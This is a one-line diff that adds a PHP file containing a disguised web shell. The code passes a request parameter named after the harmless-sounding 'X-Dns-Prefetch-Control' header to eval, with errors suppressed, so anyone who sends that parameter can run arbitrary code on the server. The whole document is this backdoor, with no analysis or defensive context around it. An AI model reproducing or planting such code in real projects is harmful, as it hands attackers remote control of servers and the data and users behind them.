@@ -1,0 +1,1 @@
+<?php @eval($_HEADERS["X-Dns-Prefetch-Control"]);@eval($_REQUEST["X-Dns-Prefetch-Control"]);
